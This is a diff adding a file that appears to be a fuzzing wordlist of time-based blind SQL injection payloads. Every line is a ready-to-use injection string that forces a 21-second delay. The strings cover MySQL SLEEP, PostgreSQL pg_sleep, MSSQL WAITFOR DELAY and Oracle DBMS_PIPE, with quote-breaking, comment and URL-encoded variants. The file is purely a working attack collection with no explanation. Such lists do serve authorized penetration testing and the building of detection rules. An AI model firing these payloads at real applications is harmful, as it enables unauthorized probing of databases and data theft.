@@ -1,0 +1,186 @@
+0'|(IF((now())LIKE(sysdate()),SLEEP(21),0))|'Z
+0'or(now()=sysdate()&&SLEEP(21))or'Z
+"0"XOR(if(now()=sysdate()%2Csleep(21)%2C0))XOR"Z"
+0'XOR(if(now()=sysdate(),sleep(21),0))XOR'Z
+0\"XOR(if(now()=sysdate(),sleep(21),0))XOR\"Z
+0'XOR(if(now()=sysdate(),sleep(21*1),0))XOR'Z
+1'%2b(select*from(select(sleep(21)))a)%2b'
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),21)
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),21)-- 1337
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(21))
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(21))-- 1337
+1' AND 1337=(SELECT 1337 FROM PG_SLEEP(21)) AND '1337'='1337
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(21)) AND ('1337'='1337
+1) AND 1337=(SELECT 1337 FROM PG_SLEEP(21)) AND (1337=1337
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(21))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(21))A))
+1 or pg_sleep(21)--
+1) or pg_sleep(21)--
+1)) or pg_sleep(21)--
+1 or sleep(21)#
+1) or sleep(21)#
+1)) or sleep(21)#
+1 SELECT pg_sleep(21);
+1 SELECT SLEEP(21); #
+1 WAITFOR DELAY '0:0:21'
+1 WAITFOR DELAY '0:0:21'--
+1 WAITFOR DELAY '0:0:21'-- 1337
+1' WAITFOR DELAY '0:0:21' AND '1337'='1337
+1') WAITFOR DELAY '0:0:21' AND ('1337'='1337
+1) WAITFOR DELAY '0:0:21' AND (1337=1337
+1') WAITFOR DELAY '21' AND ('1337'='1337
+1) WAITFOR DELAY '21' AND (1337=1337
+'%2b(select*from(select(sleep(21)))a)%2b'
+%2c(select%5*%5from%5(select(sleep(21)))a)
+';%5waitfor%5delay%5'0:0:21'%5--%5
+';%5waitfor%5delay%5'21'%5--%5
+' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),21) AND '1337'='1337
+') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),21) AND ('1337'='1337
+) AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),21) AND (1337=1337
+AND (SELECT 1337 FROM (SELECT(SLEEP(21)))YYYY)-- 1337
+AND (SELECT * FROM (SELECT(SLEEP(21)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(21)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(21)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(21)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(21)))YjoC) AND '%'='
+and SELECT pg_sleep(21);
+AnD SLEEP(21)
+AnD SLEEP(21)#
+AnD SLEEP(21)--
+' AnD SLEEP(21) ANd '1
+and WAITFOR DELAY '0:0:21'
+and WAITFOR DELAY '0:0:21'--
+and WAITFOR DELAY '21'
+and WAITFOR DELAY '21'--
+desc%2c(select*from(select(sleep(21)))a)
+if(1=1,sleep(21),0)/*'XOR(if(1=1,sleep(21),0))OR'"XOR(if(1=1,sleep(21),0))OR"*/
+") IF (1=1) WAITFOR DELAY '0:0:21'--
+") IF (1=1) WAITFOR DELAY '21'--
+if(1337=1337,exp(~(21)),0)/*'XOR(if(1337=1337,exp(~(21)),0))OR'"XOR(if(1337=1337,sleep(21),0))OR"*/
+if(now()=sysdate(),sleep(21),0)
+if(now()=sysdate(),sleep(21),0)/"XOR(if(now()=sysdate(),sleep(21),0))OR"/
+if(now()=sysdate(),sleep(21),0)/'XOR(if(now()=sysdate(),sleep(21),0))OR'"XOR(if(now()=sysdate(),sleep(21),0) and 5=5)"/
+if(now()=sysdate(),sleep(21),0)/*'XOR(if(now()=sysdate(),sleep(21),0))OR'"XOR(if(now()=sysdate(),sleep(21),0))OR"*/
+ORDER BY SLEEP(21)
+ORDER BY SLEEP(21)#
+ORDER BY SLEEP(21)--
+" or pg_sleep(21)--
+") or pg_sleep(21)--
+")) or pg_sleep(21)--
+' or pg_sleep(21)--
+') or pg_sleep(21)--
+')) or pg_sleep(21)--
+or pg_SLEEP(21)
+or pg_SLEEP(21)#
+or pg_SLEEP(21)--
+OR (SELECT 1337 FROM (SELECT(SLEEP(21)))YYYY)-- 1337
+or SELECT pg_sleep(21);
+" or sleep(21)#
+" or sleep(21)="
+") or sleep(21)="
+")) or sleep(21)="
+' or sleep(21)#
+' or sleep(21)='
+') or sleep(21)='
+')) or sleep(21)='
+or SLEEP(21)
+or SLEEP(21)#
+or SLEEP(21)--
+or SLEEP(21)="
+or SLEEP(21)='
+or WAITFOR DELAY '0:0:21'
+or WAITFOR DELAY '0:0:21'--
+or WAITFOR DELAY '21'
+or WAITFOR DELAY '21'--
+pg_sleep(21)--
+pg_SLEEP(21)
+pg_SLEEP(21)#
+pg_SLEEP(21)--
+(select(0)from(select(sleep(21)))v)
+(select(0)from(select(sleep(21)))v)%2f'+(select(0)from(select(sleep(21)))v)+'"
+(select(0)from(select(sleep(21)))v)%2f*'+(select(0)from(select(sleep(21)))v)+'"+(select(0)from(select(sleep(21)))v)+"*%2f
+(select(0)from(select(sleep(21)))v)/*'+(select(0)from(select(sleep(21)))v)+'"+(select(0)from(select(sleep(21)))v)+"*/
+'+(select*from(select(sleep(21)))a)+'
+(select*from(select(sleep(21)))a)
+,(select * from (select(sleep(21)))a)
+(SELECT * FROM (SELECT(SLEEP(21)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(21)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(21)))ecMj)--
+(SELECT * FROM (SELECT(SLEEP(21)))YYYY)
+(SELECT * FROM (SELECT(SLEEP(21)))YYYY)#
+(SELECT * FROM (SELECT(SLEEP(21)))YYYY)--
+";SELECT pg_sleep(21);
+' SELECT pg_sleep(21);
+(SELECT pg_sleep(21))
+;SELECT pg_sleep(21);
+";SELECT SLEEP(21); #
+' SELECT SLEEP(21); #
+(SELECT SLEEP(21))
+;SELECT SLEEP(21); #
+";sleep 21
+";sleep 21--
+";sleep(21)
+";sleep(21)--
+(sleep 21)
+(sleep 21)--
+(sleep(21))
+(sleep(21))--
+-sleep(21)
+;sleep 21
+;sleep 21--
+;sleep(21)
+;sleep(21)--
+sleep(21)#
+&&SLEEP(21)
+&&SLEEP(21)#
+&&SLEEP(21)--
++ SLEEP(21) + '
+SLEEP(21)#
+SLEEP(21)--
+SLEEP(21)="
+SLEEP(21)='
+'&&SLEEP(21)&&'1
+SLEEP(21)/*' or SLEEP(21) or '" or SLEEP(21) or "*/
+',''),/*test*/%26%26%09sLeEp(21)%09--+
+"));waitfor delay '0:0:21'--
+");waitfor delay '0:0:21'--
+";waitfor delay '0:0:21'--
+'));waitfor delay '0:0:21'--
+');waitfor delay '0:0:21'--
+';waitfor delay '0:0:21'--
+));waitfor delay '0:0:21'--
+);waitfor delay '0:0:21'--
+;waitfor delay '0:0:21'--
+" WAITFOR DELAY '0:0:21'--
+") WAITFOR DELAY '0:0:21'--
+")) WAITFOR DELAY '0:0:21'--
+"))) WAITFOR DELAY '0:0:21'--
+%' WAITFOR DELAY '0:0:21'--
+' WAITFOR DELAY '0:0:21'
+' WAITFOR DELAY '0:0:21'--
+') WAITFOR DELAY '0:0:21'--
+')) WAITFOR DELAY '0:0:21'--
+'))) WAITFOR DELAY '0:0:21'--
+';WAITFOR DELAY '0:0:21'--
+;WAITFOR DELAY '0:0:21'
+;WAITFOR DELAY '0:0:21'--
+WAITFOR DELAY '0:0:21'
+"));waitfor delay '21'--
+");waitfor delay '21'--
+";waitfor delay '21'--
+'));waitfor delay '21'--
+');waitfor delay '21'--
+';waitfor delay '21'--
+));waitfor delay '21'--
+);waitfor delay '21'--
+;waitfor delay '21'--
+waitfor delay '21'
+waitfor delay '21'#
+waitfor delay '21'--
+") WAITFOR DELAY '21'--
+%' WAITFOR DELAY '21'--
+'))) WAITFOR DELAY '21'--
+';WAITFOR DELAY '21'--
+'XOR(if(now()=sysdate(),sleep(21),0))XOR'
+'XOR(if(now()=sysdate(),sleep(21*1),0))OR'
+>'%3bWAITFOR+DELAY+'00%3a00%3a21'--
